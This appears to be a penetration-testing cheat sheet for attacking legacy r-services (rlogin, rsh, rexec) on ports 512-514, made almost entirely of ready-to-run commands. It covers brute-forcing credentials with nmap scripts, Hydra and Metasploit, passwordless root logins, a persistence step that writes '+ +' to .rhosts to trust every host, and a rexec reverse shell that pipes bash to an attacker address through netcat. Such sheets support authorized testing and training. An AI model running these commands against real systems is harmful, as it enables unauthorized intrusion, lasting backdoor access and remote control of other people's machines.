!!! tip "Start here"
    Try passwordless rlogin immediately: `rlogin -l root <target>` — if `.rhosts` contains `+ +` or the target trusts your source IP, you get a shell with no credentials. Also try `rsh -l root <target> id` to test rsh trust. These services are rare but almost always misconfigured when present.

## Enumeration 
### Checking for Open R-Service Ports
```bash
nmap -p 512-514 --script=rexec-brute,rsh-brute,rlogin-brute <target-ip>
```

Check supported authentication methods explicitly:
```bash
nmap -p 513 --script=rlogin-enum <target-ip>
nmap -p 514 --script=rsh-enum <target-ip>
```

## Authentication Attacks
### Checking for Rlogin Trust files
Rlogin trusts `~/.rhosts` and `/etc/hosts.equiv` files for **password-less authentication**.
Check if authentication works without a password:
```bash
rlogin -l username <target-ip>
```

* If no username is known, try using `root`, `admin`, or `user`.
### Persistence
If Rlogin allows access, modify `.rhosts` to enable persistent access:
```bash
echo "+ +" > ~/.rhosts
chmod 600 ~/.rhosts
```

### Brute-Forcing R-Services
Hydra:
```bash
hydra -L users.txt -P passwords.txt rexec://<target-ip>
```

MSF:
```bash
msfconsole
use auxiliary/scanner/rservices/rexec_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

## Remote Shell Exploitation (rsh)
```bash
rsh -l root <target-ip> "id; uname -a; whoami"
```

If successful, directly access interactive shell:
```
rsh -l root <target-ip>
```

## RCE via Rexec
```bash
rexec <target-ip> -l user -p password "id"
```

Execute a reverse shell:
```bash
rexec <target-ip> -l user -p password "nc -e /bin/bash <attacker-ip> <port>"
```

Start a listener:
```bash
nc -lvnp <port>
```

## Remote Execution with Plaintext Creds
If credentials were found or obtained previously, attempt remote execution using `rexec`:
```bash
rexec -l username -p password <target-ip> "id; uname -a"
```

